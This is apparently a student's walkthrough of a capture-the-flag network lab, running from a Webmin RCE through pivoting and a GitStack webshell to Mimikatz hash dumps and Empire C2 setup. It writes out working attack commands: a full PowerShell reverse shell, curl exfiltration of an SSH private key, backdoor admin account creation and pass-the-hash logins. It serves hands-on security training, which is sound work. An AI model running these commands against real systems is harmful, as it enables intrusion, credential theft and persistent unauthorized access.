# Task 5: Webserver Enumeration

Nmap OS detection and basic port scan
```
nmap -O 10.200.87.200 > nmap-O.txt
```

![2578a685531f106f9e25a76b1994aac7.png](2578a685531f106f9e25a76b1994aac7-1.png)

How many of the first 15000 ports are open on the target?
> 4

Nmap aggressive scan and HTML conversion
```
nmap -A -p 22,80,443,10000 10.200.87.200 -oX nmap-A
xsltproc nmap-A.xml -o nmap-A.html
```

![bf8e7bcde43fc5c91ef8ba35593e037c.png](bf8e7bcde43fc5c91ef8ba35593e037c-1.png)

What OS does Nmap think is running?
> centos

What site does the server try to redirect you to?
> https://thomaswreath.thm

Adding entry to `/etc/hosts` for the HTTP redirection

![b9841f0f12c66d45c42566c4a3f17b87.png](b9841f0f12c66d45c42566c4a3f17b87-1.png)

Visiting `https://thomaswreath.thm` in browser (after accepting the TLS error)

![9220c8a4742f554f9a77da9285000cad.png](9220c8a4742f554f9a77da9285000cad-1.png)

Basic web browsing OSINT

![19982f72467b8f520cf4d7c2eda0f8cb.png](19982f72467b8f520cf4d7c2eda0f8cb-1.png)

What is Thomas' mobile phone number?
> 447821548812

Looking back at Nmap results for details of highest port

![06cc3aba975faaed7115a93317b5d091.png](06cc3aba975faaed7115a93317b5d091-1.png)

What server version does Nmap detect as running here?
> MiniServ 1.890 Webmin httpd

Searching for an exploit with `searchsploit`
```
searchsploit "webmin 1.890" 
```

![51873af9bb9ae90f63f52f526219f33c.png](51873af9bb9ae90f63f52f526219f33c-1.png)

Searching on exploit-db for more details

![1a29bab2b102f0ec262109cca644814a.png](1a29bab2b102f0ec262109cca644814a-1.png)

What is the CVE number for this exploit?
> CVE-2019-15107


# Task 6: Webserver Exploitation

Running the given exploit: 
```
git clone https://github.com/MuirlandOracle/CVE-2019-15107
cd CVE-2019-15107 && pip3 install -r requirements.txt
chmod +x ./CVE-2019-15107.py
./CVE-2019-15107.py 10.200.87.200
```

![629d26b9cdf263ea152dccca5c9ded3a.png](629d26b9cdf263ea152dccca5c9ded3a-1.png)

Which user was the server running as?
> root

Getting a reverse shell from the RCE (IP is Kali's)

![2083ff3c3a482cf0fd57ef296380aed0.png](2083ff3c3a482cf0fd57ef296380aed0-1.png)

![a3e4a029166676c442ea464ce6c5778d.png](a3e4a029166676c442ea464ce6c5778d-1.png)

Getting root password's hash
```
cat /etc/shadow | grep root
```

![971e2b30cd25c4b7a86cf14bb5a41233.png](971e2b30cd25c4b7a86cf14bb5a41233-1.png)

What is the root user's password hash?
> `$6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1`

What is the full path to this file (for SSH persistence)?
> /root/.ssh/id_rsa

Start updog on Kali for HTTP file server
```
updog
```

![4e5a88b7234adb6522dd528df40d7ea1.png](4e5a88b7234adb6522dd528df40d7ea1-1.png)

Upload SSH key to updog using `curl`
```
curl -v -X POST -F "file=@/root/.ssh/id_rsa;filename=id_rsa" -F "path=./" http://10.50.88.103:9090/upload
```

![2ffb23f91cd37b42032df6797cf95a4c.png](2ffb23f91cd37b42032df6797cf95a4c-1.png)

Changing for correct permissions on SSH key and testing connection
```
chmod 600 id_rsa
ssh -i id_rsa root@10.200.87.200 
```

![1abc12159d575e0fc998388f24b4e7a1.png](1abc12159d575e0fc998388f24b4e7a1-1.png)

# Task 8: Pivoting High-level Overview
Which type of pivoting creates a channel through which information can be sent hidden inside another protocol?
> tunnelling

Which Metasploit Framework Meterpreter command can be used to create a port forward?
> portfwd

# Task 9: Pivoting Enumeration
What is the absolute path to the file containing DNS entries on Linux?
> /etc/resolv.conf

What is the absolute path to the hosts file on Windows?
> c:\Windows\System32\Drivers\etc\hosts

How could you see which IP addresses are active and allow ICMP echo requests on the 172.16.0.x/24 network using Bash?
> `for i in {1..255}; do (ping -c 1 172.16.0.${i} | grep "bytes from" &); done`

Bash ping sweeper
```
for i in {1..255}; do (ping -c 1 172.16.0.${i} | grep "bytes from" &); done
```

Bash port scanner
```
for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done
```

# Task 10: Pivoting Proxychains & Foxyproxy
Remember that proxying scans like Nmap will be very slow and should only be used as last resort. If possible, live off the land or load static binaries. If you do end up doing an Nmap scan through proxychains, comment out the `proxy_dns` line in the config first. 

What line would you put in your proxychains config file to redirect through a socks4 proxy on 127.0.0.1:4242?
> socks4 127.0.0.1:4242

What command would you use to telnet through a proxy to 172.16.0.100:23?
> proxychains telnet 172.16.0.100:23

Which tool is more apt for proxying to a webapp: Proxychains (PC) or FoxyProxy (FP)?
> FP

# Task 11: Pivoting SSH Tunnelling / Port Forwarding
For this task, note 3 example IPs:
- 172.16.0.5 - pivot target
- 172.16.0.10 - webserver
- 172.16.0.20 - Kali / attacker

### Forward Connections
Forward means from Kali to pivot target machine.

Forwards local port 8000 (on Kali) to webserver at 172.16.0.10:80, accessible only through 172.16.0.5
```
ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN
```

Proxies local port 1337 to send data through 172.16.0.5
```
ssh -D 1337 user@172.16.0.5 -fN
```

Note: the `-fN` switches backgrounds the shell and only sets up the connection (nothing else)

### Reverse Connections
Reverse means from pivot target machine back to Kali.
Riskier because you need to initiate a connection from the target machine to your Kali instance. Could be useful if you don't have direct SSH access to the pivot target, for example.

To do this, you need to: 
1. Generate an SSH key pair with `ssh-keygen`
2. Copy the public key contents 
3. In your Kali `authorized_keys` file, type the following line, then paste in the public key (this makes sure that the key can only be used for port forwarding and not a shell):
```
command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty
```
4. Make sure that the SSH server is running on Kali

Now that a secure connection is possible, initiate the remote port forwarding from the target to Kali. 

Remember: These commands are run on the pivot target, 172.16.0.5, NOT on Kali.

Forwards remote port 8000 (on Kali) to webserver at 172.16.0.10:80, accessible only through 172.16.0.5
```
ssh -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -fN
```

Proxies remote port 1337 (on Kali) to send data through 172.16.0.5
```
ssh -R 1337 kali@172.16.0.20 -i KEYFILE -fN
```

If you're connecting to an SSH server from your attacking machine to create a port forward, would this be a local (L) port forward or a remote (R) port forward?
> L

Which switch combination can be used to background an SSH port forward or tunnel?
> -fN

It's a good idea to enter our own password on the remote machine to set up a reverse proxy, Aye or Nay?
> Nay

What command would you use to create a pair of throwaway SSH keys for a reverse connection?
> ssh-keygen

If you wanted to set up a reverse portforward from port 22 of a remote machine (172.16.0.100) to port 2222 of your local machine (172.16.0.200), using a keyfile called id_rsa and backgrounding the shell, what command would you use? (Assume your username is "kali")
> `ssh -R 2222:172.16.0.100:22 kali@172.16.0.200 -i id_rsa -fN`

What command would you use to set up a forward proxy on port 8000 to user@target.thm, backgrounding the shell?
> `ssh -D 8000 user@target.thm -fN`

If you had SSH access to a server (172.16.0.50) with a webserver running internally on port 80 (i.e. only accessible to the server itself on 127.0.0.1:80), how would you forward it to port 8000 on your attacking machine? Assume the username is "user", and background the shell.
> `ssh -L 8000:127.0.0.1:80 user@172.16.0.50 -fN`

# Task 12: Pivoting plink.exe
Plink.exe is the Windows cmd version of the Putty SSH client. Nowadays, this is less useful because Windows comes with SSH already. 

Our use of Plink tends to be a case of transporting the binary to the target, then using it to create a reverse connection.

The syntax is nearly identical to standard SSH, with the exception of the warning message workaround at the beginning.

Forwards remote port 8000 (on Kali) to webserver at 172.16.0.10:80, accessible only through 172.16.0.5
```
cmd.exe /c echo y | .\plink.exe -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -N
```

Normal `ssh-keygen` keys do not work with Putty, so you have to convert them. The public key doesn't need to be converted before adding to the `authorized_keys` file.
```
sudo apt install putty-tools
puttygen KEYFILE -o OUTPUT.ppk
```

# Task 13: Pivoting Socat
Socat is great for stable Linux shells and port forwarding. It can also be used to encrypt your connections. Unfortunately, it is not available by default, so you should use a static binary.

Basically, Socat is like a portal gun. Trust me.

You can also set it up as a reverse shell forwarder like so: 
![603a93ca4d33046563ada09632de0cb5.png](603a93ca4d33046563ada09632de0cb5-1.png)

### Reverse Shell Relay
First, start a standard netcat listener on Kali. Then run socat on the compromised machine to start the relay.
```
sudo nc -nvlp 443  # on Kali 
./socat tcp-l:8000 tcp:ATTACKING_IP:443 &  # on target
```

Note: the order of the addresses matters.

From here we can then create a reverse shell to point to the newly opened port 8000 on the compromised server.

### Port Forwarding: Easy
Quick and easy way is to open a listening port on the compromised server, then redirect traffic to the target server. 

Opens up port 33060 on the compromised server, and redirects traffic to 172.16.0.10:3306
```
./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &
```

- The `fork` option is used to put every connection into a new process
- The `reuseaddr` option means that the port stays open after a connection is made (same listening port can be used for more than one connection)

### Port Forwarding: Quiet
Previous technique works, but it opens a port on the compromised server, which can be detected easily. 

Here are the steps:

On Kali, open up two ports: 8000 and 8001, creating a local port relay.
```
socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
```

On the compromised server, forward the target port
```
./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &
```

With that done, you can visit the target website or whatever by going to `localhost:8000` on Kali.

### Closing port forwards and relays
Run `jobs`, then `kill %NUMBER` for the forwards/relays.

Which socat option allows you to reuse the same listening port for more than one connection?
> reuseaddr

If your Attacking IP is 172.16.0.200, how would you relay a reverse shell to TCP port 443 on your Attacking Machine using a static copy of socat in the current directory?
Use TCP port 8000 for the server listener, and do not background the process.
> `./socat tcp-l:8000 tcp-l:172.16.0.200:443`

What command would you use to forward TCP port 2222 on a compromised server, to 172.16.0.100:22, using a static copy of socat in the current directory, and backgrounding the process (easy method)?
> `./socat tcp-l:2222,fork,reuseaddr tcp-l:172.16.0.100:22 &`

# Task 14: Pivoting Chisel
Chisel can work without SSH access.
Note: You must have a copy of the chisel binary on both the attacking machine and compromised server.

Chisel has two modes: client and server. Access the help menu using the command `chisel client|server --help`

### Reverse SOCKS Proxy
This connects back from a compromised server to a listener waiting on the attacking machine. 

On attacking box: 
```
./chisel server -p LISTEN_PORT --reverse &
```

On compromised server: 
```
./chisel client ATTACKING_IP:LISTEN_PORT R:socks &
```

![f9ce389d70b0e7ad1e6617c71f9060b3.png](f9ce389d70b0e7ad1e6617c71f9060b3-1.png)

Note that the actual proxy has been opened on `127.0.0.1:1080`. This is where traffic should be directed to on the attacking machine.

### Forward SOCKS Proxy
Forward proxies are rarer than reverse proxies for the same reasons reverse shells are more popular. Generally speaking, egress firewalls are less strict, so reverse connections are better. 

On compromised server: 
```
./chisel server -p LISTEN_PORT --socks5
```

On attacking box: 
```
./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks
```

The SOCKS proxy would be opened on port `PROXY_PORT` of our attacking box. You would need to add this port to your proxychains config.

### Remote Port Forward (reverse port forward)
A remote port forward is when we connect back from a compromised target to create the forward.

On attacking box: 
```
./chisel server -p LISTEN_PORT --reverse &
```

On compromised server: 
```
./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &
```

Note: `LOCAL_PORT` is the port we want to open on the attacking box. Differentiate it from the `LISTEN_PORT`. The syntax is similar to the SSH reverse port forward.

### Local Port Forward
A local port forward is where we connect from our own attacking machine to a compromised target.

On compromised server:
```
./chisel server -p LISTEN_PORT
```

On attacking box: 
```
./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT
```

### Closing port forwards and proxies
Just like the backgrounded socat, use `jobs` and `kill %NUMBER` to destroy the chisel processes.

What command would you use to start a chisel server for a reverse connection on your attacking machine?
Use port 4242 for the listener and do not background the process.
> `./chisel server -p 4242 --reverse`

What command would you use to connect back to this server with a SOCKS proxy from a compromised host, assuming your own IP is 172.16.0.200 and backgrounding the process?
> `./chisel client 172.16.0.200:4242 R:socks &`

How would you forward 172.16.0.100:3306 to your own port 33060 using a chisel remote port forward, assuming your own IP is 172.16.0.200 and the listening port is 1337? Background this process.
> `./chisel client 172.16.0.200:1337 33060:172.16.0.11:3306 &`

If you have a chisel server running on port 4444 of 172.16.0.5, how could you create a local portforward, opening port 8000 locally and linking to 172.16.0.10:80?
> `./chisel client 172.16.0.5:4444 8000:172.16.0.10:80`

# Task 15: Pivoting sshuttle
In short, sshuttle uses an SSH connection to create a tunnelled proxy that acts like a VPN. It doesn't require proxychains, and basically updates routing tables automagically. However, it only works on Linux targets and requires SSH and Python installed on the target.

Syntax: 
```
sshuttle -r user@172.16.0.5 172.16.0.0/24
```

Sshuttle doesn't have a shorthand for providing a private key, but can use the `--ssh-cmd` switch instead.
```
sshuttle -r user@172.16.0.5 --ssh-cmd "ssh -i private_key" 172.16.0.0/24
```

Note: you may encounter an error like this: 
![c0de080decc47059dba153a2a6fd682a.png](c0de080decc47059dba153a2a6fd682a-1.png)

This can happen when the compromised machine you're connecting to is part of the subnet you want to access. To get around this, just tell sshuttle to exclude the machine from the subnet range using the `-x` switch.

```
sshuttle -r user@172.16.0.5 172.16.0.0/24 -x 172.16.0.5
```

How would you use sshuttle to connect to 172.16.20.7, with a username of "pwned" and a subnet of 172.16.0.0/16?
> `sshuttle -r pwned@172.16.20.7 172.16.0.0/16`

What switch (and argument) would you use to tell sshuttle to use a keyfile called "priv_key" located in the current directory?
> `--ssh-cmd "ssh -i priv_key"`

You are trying to use sshuttle to connect to 172.16.0.100.  You want to forward the 172.16.0.x/24 range of IP addreses, but you are getting a Broken Pipe error.
What switch (and argument) could you use to fix this error?
> `-x 172.16.0.100`

# Task 17: Git Server Enumeration
Download the static nmap binary from https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap?raw=true

Starting updog webserver on Kali (where binary is)
```
mv nmap nmap-bin
updog
```

Download nmap binary from compromised machine
```
curl http://10.50.88.103:9090/nmap-bin -o /tmp/nmap-bin
chmod +x /tmp/nmap-bin
cd /tmp
```

![881c1701fe447876ce0b1941a2a0b4e7.png](881c1701fe447876ce0b1941a2a0b4e7-1.png)

Note: other users' files are also available.

Now scan the network with the binary
```
./nmap-bin -sn 10.200.87.0/24 -oN scan-test1337
```

Note that the `.250` and `.1` hosts are out of scope.

Showing scan results
```
cat scan-test1337 | grep report
```

![0c2bb6c3cb96a9a632bfd0d63d22278b.png](0c2bb6c3cb96a9a632bfd0d63d22278b-1.png)

Excluding the out of scope hosts, and the current host (`.200`), how many hosts were discovered active on the network?
> 2

In ascending order, what are the last octets of these host IPv4 addresses? (e.g. if the address was 172.16.0.80, submit the 80)
> 100,150

Scan the hosts that are up with stealth scanning
```
/nmap-bin -sS -p0-15000 10.200.87.100,150 -oN scan-test1337-sS
```

Show the results
```
cat scan-test1337-sS
```

![92ae635f38881d4a36a4421f9587fdf5.png](92ae635f38881d4a36a4421f9587fdf5-1.png)

Scan the hosts -- which one does not return a status of "filtered" for every port (submit the last octet only)?
> 150

Which TCP ports (in ascending order, comma separated) below port 15000, are open on the remaining target?
> 80,3389,5985

Note: Apparently the 5357 port is a fluke. If I scan it by itself, it indeed comes out as filtered for some reason.

![f86649c856ab0d1711f06094e05354dc.png](f86649c856ab0d1711f06094e05354dc-1.png)

We can't do a service detection scan using the nmap static binary, so we might have to set up a proxy.

```
./nmap-bin -sV 10.200.87.150
```

![d35224a1f2d936add8e33ae463ad47fe.png](d35224a1f2d936add8e33ae463ad47fe-1.png)

Assuming that the service guesses made by Nmap are accurate, which of the found services is more likely to contain an exploitable vulnerability?
> http

# Task 18: Git Server Pivoting
Pivot using sshuttle from attacking machine to the prod-server 
```
sshuttle -r root@10.200.87.200 10.200.87.0/24 -x 10.200.87.200 --ssh-cmd "ssh -i id_rsa"
```

Proxied nmap scan on internal target
```
nmap -A -p 80,3389,5985 10.200.87.150 -oX nmap-150-A.xml
xsltproc nmap-150-A.xml -o nmap-150-A.html
```

![0a9ef25b448e97ecb0b5aae1739fda9d.png](0a9ef25b448e97ecb0b5aae1739fda9d-1.png)

Visiting the webpage at `http://10.200.87.150`
![db7e7d3433f63646cccf452a7cda6d7e.png](db7e7d3433f63646cccf452a7cda6d7e-1.png)

It seems that this web server is running some sort of potential `gitstack` instance looking at the webpage.

What is the name of the program running the service?
> gitstack

Visiting the webpage at `http://10.200.87.150/gitstack`
![b6efc2c24f6ce617f84f586a4cd124f2.png](b6efc2c24f6ce617f84f586a4cd124f2-1.png)

Trying the default credentials `admin:admin`
![de8ce2d879302d2d350e787cb1312cc5.png](de8ce2d879302d2d350e787cb1312cc5-1.png)

Do these default credentials work (Aye/Nay)?
> nay

Searching for exploits related to gitstack on Kali.
```
searchsploit "gitstack"
```

![bfe65f78a87317759cfb8f5d389bd81e.png](bfe65f78a87317759cfb8f5d389bd81e-1.png)

There is one Python RCE exploit for version 2.3.10 of the service. What is the EDB ID number of this exploit? 
> 43777

# Task 19: Git Server Code Review
Make a copy of the exploit using `searchsploit`
```
searchsploit -m 43777
```

![3e5e11ac7d1f7181281e22429be67348.png](3e5e11ac7d1f7181281e22429be67348-1.png)

Note that this is an older script that uses Python 2 instead of Python 3. 

Look at the information at the top of the script. On what date was this exploit written?
> 18.01.2018

Is the script written in Python2 or Python3?
> python2

Changing the target IP and exploit webshell name in the exploit (make sure to change all instances of `exploit.php`). 
![074961078295219b8da3936f0c7a93ff.png](074961078295219b8da3936f0c7a93ff-1.png)
![bc3a496b7a92a6f955c7edbfe679b7bc.png](bc3a496b7a92a6f955c7edbfe679b7bc-1.png)

Just to confirm that you have been paying attention to the script: What is the name of the cookie set in the POST request made on line 74 (line 73 if you didn't add the shebang) of the exploit? 
> csrftoken

# Task 20: Git Server Exploitation
Running the exploit
```
python2 43777.py
```

Looks like we have SYSTEM access now!
![d36ade61cf5f669b09936eeccac5091e.png](d36ade61cf5f669b09936eeccac5091e-1.png)

Using knowledge of the exploit, we know that a webshell has been opened, so there is no need to run the exploit again. Instead, we can use `curl` to inject commands.

Recall that the webshell was placed at `http://10.200.87.150/web/exploit-test1337.php`

![11888e5404fb4125303d27766efaf5a3.png](11888e5404fb4125303d27766efaf5a3-1.png)

Therefore, we can execute commands using curl with the following syntax: 
```
curl -X POST http://10.200.87.150/web/exploit-test1337.php -d "a=COMMAND"
```

![c2df8afc8e624de453dec3ed40704952.png](c2df8afc8e624de453dec3ed40704952-1.png)

Some basic enumeration
![e370ef6cf4fd2e1790acea886897aa83.png](e370ef6cf4fd2e1790acea886897aa83-1.png)

What is the hostname for this target? 
> git-serv

What operating system is this target? 
> Windows
 
What user is the server running as? 
> nt authority\system

Before we go for a reverse shell, need to see if the box has any outside access. 

First we set up a `tcpdump` listener on the `tun0` interface facing the THM network. 
```
sudo tcpdump -i tun0
```

![a588d0dfd69d12699750d3e3c617d3f3.png](a588d0dfd69d12699750d3e3c617d3f3-1.png)

Then, we induce the compromised box to ping that interface IP address
```
ping -n 3 10.50.88.103
```

![c50263d3d920c1937f87f18fb9beef22.png](c50263d3d920c1937f87f18fb9beef22-1.png)
![491d06904790d0d8bfdcc0a203a9dc31.png](491d06904790d0d8bfdcc0a203a9dc31-1.png)

Well, looks like all the packets seen were outbound (from the SSH proxy and such), and all the IP packets were filtered or dropped somewhere along the way. 

This will send three ICMP ping packets back to you. How many make it to the waiting listener? 
> 0

Since the machine has no outside access (but we have a stable shell on `.200`) we can set up a socat reverse shell relay. 

First, download the socat static binary to Kali and serve it with updog. Then download the binary on the relay `.200` machine with curl. 
```
updog  # on Kali 
curl -O http://10.50.88.103:9090/socat  # on relay
chmod +x socat  # on relay
```

Next, since `firewalld` on the `.200` machine (CentOS) is restrictive, we need to allow the port that the `.150` machine (Windows) will connect back to.  
```
firewall-cmd --add-port=15751/tcp
```

Next, set up the reverse shell relay.
```
sudo nc -nvlp 443  # on Kali 
./socat tcp-l:15751 tcp:10.50.88.103:443 &  # on relay
```

With our remote code execution `curl` command, we can execute the following Powershell reverse shell (replace IP with 10.200.87.200 and PORT with 15751): 
```
powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Before execution, use https://www.urlencoder.org/ to convert the payload to URL encoding so that nothing breaks. 

The final curl command looks like this: 
```
curl -X POST http://10.200.87.150/web/exploit-test1337.php -d "a=powershell.exe%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.200.87.200%27%2C15751%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22"
```

Yes! A reverse shell has returned for us. 
![4fdbd2bf9a04f93a24ec289da576ba64.png](4fdbd2bf9a04f93a24ec289da576ba64-1.png)

# Task 21: Git Server Stabilisation & Post Exploitation 
Remember that ports 3389 and 5985 were open on the Windows machine. This means we can potentially use RDP or Evil-WinRM for better persistent access. 

With our reverse shell, we can create a user with access to both (Administrators have RDP access, and Remote Management is for WinRM): 
```
net user test-1337 changeMe#123 /add
net localgroup Administrators test-1337 /add
net localgroup "Remote Management Users" test-1337 /add
```

Testing the WinRM connection: 
```
evil-winrm -i 10.200.87.150 -u test-1337 -p changeMe#123
```

![27af1a0908f7a8b86ba5188cc01a85cc.png](27af1a0908f7a8b86ba5188cc01a85cc-1.png)

Now, we can use RDP to attach a shared drive of various Kali tools for Windows exploitation like Mimikatz. 
```
xfreerdp /v:10.200.87.150 /u:test-1337 /p:changeMe#123 +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share
```

![fa00ae8441175a407328a2cd550dcb67.png](fa00ae8441175a407328a2cd550dcb67-1.png)

![afd2693c1426c0e55ba3b31a46b9342b.png](afd2693c1426c0e55ba3b31a46b9342b-1.png)

Next, run Mimikatz through Powershell using the shared drive. 
```
\\tsclient\share\mimikatz\x64\mimikatz.exe
```

Elevate our privileges and dump those hashes!
```
privilege::debug
token::elevate
lsadump::sam
```

![7bd4cf1d9bfa34fdada3ad5e9e3c4db5.png](7bd4cf1d9bfa34fdada3ad5e9e3c4db5-1.png)

![b8c42f56e478cd83b6c58bf6bce25309.png](b8c42f56e478cd83b6c58bf6bce25309-1.png)

![112f1e8eaacb39a100a648fa11c4b5ef.png](112f1e8eaacb39a100a648fa11c4b5ef-1.png)

![86dff753cb809f91486700fc79083faf.png](86dff753cb809f91486700fc79083faf-1.png)

What is the Administrator password hash?
> 37db630168e5f82aafa8461e05c6bbd1 

What is the NTLM password hash for the user "Thomas"?
> 02d90eda8f6b6b06c32d5f207831101f 

We can crack Thomas's NTLM hash easily with https://crackstation.net/

![39947c6e011d2cd87ae50d72aa4a0ef8.png](39947c6e011d2cd87ae50d72aa4a0ef8-1.png)

What is Thomas' password?
> i<3ruby

Even though we can't crack the Administrator password, we can also use Evil-WinRM to pass the admin's hash. 
```
evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.87.150
```

![6586e2838fd3abbe95b7ce79a3a3ab9a.png](6586e2838fd3abbe95b7ce79a3a3ab9a-1.png)

# Task 23: C2 Empire: Installation
Empire is the CLI based C2 framework that has a server and client mode. Starkiller is a GUI extension for Empire. Make sure to use Empire 4.x for this walkthrough. 

Make sure to install Empire and Starkiller.
```
sudo apt install powershell-empire starkiller
```

Start the Empire server with
```
sudo powershell-empire server
```

![e7fd12d66d1ba35dbdc694c469bf8c78.png](e7fd12d66d1ba35dbdc694c469bf8c78-1.png)

Start the Empire client
```
powershell-empire client
```

![dbc32e13a3fe88ccb04fee092060cfab.png](dbc32e13a3fe88ccb04fee092060cfab-1.png)

If you want to use Starkiller, you can do so by running `starkiller` on the terminal, then signing into the API.

![537fe053058c31bdeeddec7e60b541e7.png](537fe053058c31bdeeddec7e60b541e7-1.png)

# Task 24: C2 Empire: Overview
- Listeners - listen for a connection (from targets)
- Stagers - payloads to create a reverse shell for listener
- Agents - like a Metasploit "session"
- Modules - used against agents for post-exploitation

Can we get an agent back from the git server directly (Aye/Nay)?
> nay

# Task 25: C2 Empire: Listeners
Default listener is the HTTP listener.

In Empire CLI, start an HTTP listener and set the options
```
uselistener http
set Name CLIhttp
set Host http://10.50.88.103
set Port 8000
```

![7b93cea8cc84de081e400ee56f9caf39.png](7b93cea8cc84de081e400ee56f9caf39-1.png)

Start the listener with `execute` (can exit out of the menu using `back` or `main`)

We can see our listeners with the `listeners` command and `kill LISTENER_NAME` if needed.

![bf9c7351846cb3401640eac9175689fd.png](bf9c7351846cb3401640eac9175689fd-1.png)

# Task 26: C2 Empire: Stagers
Stagers are Empire's payloads. They connect back to listeners, creating an agent.

From the main Empire prompt, type `usestager ` (including the space!)  to get a list of available stagers in a dropdown menu. When in doubt, `multi/launcher` is pretty good.

Create a basic stager, making sure to set the listener. 
```
usestager multi/bash
set Listener CLIhttp
execute
```

![298bcc7845702df1432e8a10a3161461.png](298bcc7845702df1432e8a10a3161461-1.png)

Then save the stager payload to a file.
```
touch stager.sh
vim stager.sh  # paste clipboard contents
```

# Task 27: C2 Empire: Agents
Of course, since we have direct SSH access to the `.200` machine, we can just directly execute the stager payload on the terminal instead of doing any file transfers at all. 

![188657fb3898f7b517f444ec1c51d225.png](188657fb3898f7b517f444ec1c51d225-1.png)

See that the agent checks back with Empire.
![c9c200e326939038bae61ed16a4c9be6.png](c9c200e326939038bae61ed16a4c9be6-1.png)

From here, we can list agents and interact with them.
```
agents
interact AGENT_NAME
```

![1a27fe4543bcf0ad9621a1bd1230dedf.png](1a27fe4543bcf0ad9621a1bd1230dedf-1.png)

We can use `help` to see available commands along with some other useful commands after `back` ing out to the agents menu: 
```
kill AGENT_NAME
rename AGENT_NAME NEW_AGENT_NAME
```

Using the help command for guidance: in Empire CLI, how would we run the whoami command inside an agent?
> shell whoami

Since this agent was just for practice, kill it and let's look at actually proxying Empire agents.
```
back 
agents
kill AGENT_NAME
```

![4673adf1417e0d40592e1a0704547587.png](4673adf1417e0d40592e1a0704547587-1.png)

# Task 28: C2 Empire: Hop Listeners
Hop listeners create what looks like a regular listener. Instead of just opening a port to listen to, they create files to be copied to the "jump" server that will then serve the listener there. 

Create a hop listener in Empire. (Note that the Host and Port are the jump server's, not Kali's)
```
main
uselistener http_hop
set RedirectListener CLIhttp
set Host 10.200.87.200
set Port 15752
execute
```

![624b02b08f59f2131d229244c4935309.png](624b02b08f59f2131d229244c4935309-1.png)

This will write some `.php` files into the `/tmp/http_hop` directory.

# Task 29: C2 Git Server
Two more things to do before we can get an agent from the Windows Git server.
- Generate an appropriate stager
- Put the hop listener `.php` files on `.200` and serve them using a webserver that can execute PHP on the port we specified

Creating a stager
```
usestager multi/launcher
set Listener http_hop
execute
```

![8e695886c85984b7930c3f8ddd783f20.png](8e695886c85984b7930c3f8ddd783f20-1.png)

![728c5cbf4857156b7b1cfe5b3cd0b31a.png](728c5cbf4857156b7b1cfe5b3cd0b31a-1.png)

Make sure to save the stager command to your clipboard or a file for later reference / execution.

Preparing the hop listener files for upload
```
cd /tmp/http_hop
sudo zip -r hop.zip * 
```

![0a6a1566d5beb3e63acf50432c0da72c.png](0a6a1566d5beb3e63acf50432c0da72c-1.png)

Downloading the hop listener files from `.200`
```
updog  # on Kali

# on centos jump server, .200
mkdir /tmp/hop-test-1337
cd /tmp/hop-test-1337
curl 10.50.88.103:9090/hop.zip -o hop.zip
unzip hop.zip
```

![cc3e547a5f0650c3d41644bdade7e32a.png](cc3e547a5f0650c3d41644bdade7e32a-1.png)

Next, we open the hop listener port on the server (remember that centos has `firewalld`)
```
firewall-cmd --add-port=15752/tcp
```

Finally, since the server already has PHP, we can use the PHP dev server to serve our files quickly. (A standard Python HTTP server can't interpret the PHP language, so this is a good trick for PHP files)
```
php -S 0.0.0.0:15752 &>/dev/null &
```

![2f55c9cc64067f3fa3571b874f7a8b55.png](2f55c9cc64067f3fa3571b874f7a8b55-1.png)

Now we can use the webshell to the Git server from earlier to execute the stager to get an Empire agent. Make sure to URL encode the payload first. 
```
curl -X POST http://10.200.87.150/web/exploit-test1337.php -d "a=powershell..."
```

![e7f71784737f2e251d612f1d191df1e5.png](e7f71784737f2e251d612f1d191df1e5-1.png)

I'm not sure why but I get errors here trying to run the stager payload and never get an agent. 

![e386adb7e6a309228187ad7276161e29.png](e386adb7e6a309228187ad7276161e29-1.png)

**IMPORTANT**: At this point, I decided to skip the Empire modules. Note that the IP subnet for the Wreath network changed from `10.200.87.x` to `10.200.101.x` because of time restrictions.

# Task 33: Personal PC Enumeration

With evil-winrm, you can actually load local scripts without having to touch the disk of the remote machine at all. In this case, we can load the empire post exploitation modules (included with the empire apt install)

```
